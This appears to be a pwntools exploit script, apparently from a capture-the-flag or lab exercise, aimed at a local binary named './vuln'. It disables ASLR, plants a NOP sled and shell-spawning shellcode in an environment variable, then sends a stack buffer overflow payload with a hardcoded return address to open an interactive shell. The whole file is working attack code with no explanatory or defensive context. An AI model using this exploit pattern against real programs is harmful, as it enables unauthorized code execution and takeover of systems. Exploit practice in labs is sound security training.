#!/usr/bin/env python
from pwn import *
import os

BIN = "./vuln"
context.binary = BIN
context.aslr = False

elf = ELF(BIN)


shellcode = asm("nop") * 4000 + asm(shellcraft.sh())

fd = open("shellcode", "wb")
fd.write(shellcode)


io = process(BIN, env = {'SHELLCODE': shellcode})
# gdb.attach(io, '''start''')

# First part: inject
payload = b""
payload += b"A" * (4+8)
payload += p64(0x7fffffffe7b0 + 150)


io.send(payload)
io.interactive()
